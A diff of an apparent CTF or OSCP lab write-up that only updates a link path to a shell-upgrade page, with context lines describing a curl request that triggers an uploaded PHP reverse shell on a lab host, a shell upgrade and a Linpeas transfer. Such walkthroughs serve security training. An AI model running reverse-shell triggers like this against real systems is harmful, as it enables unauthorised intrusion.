@@ -132,8 +132,8 @@ curl http://10.10.0.103/temp/php-reverse-shell.php
 * We landed in the root directory
 * Time to fix our shell to a more stable /bin/bash
 
-{% content-ref url="../../../fully-interactive-shell-upgrade.md" %}
-[fully-interactive-shell-upgrade.md](../../../fully-interactive-shell-upgrade.md)
+{% content-ref url="../../../oscp/fully-interactive-shell-upgrade.md" %}
+[fully-interactive-shell-upgrade.md](../../../oscp/fully-interactive-shell-upgrade.md)
 {% endcontent-ref %}
 
 * Transferred Linpeas with no luck
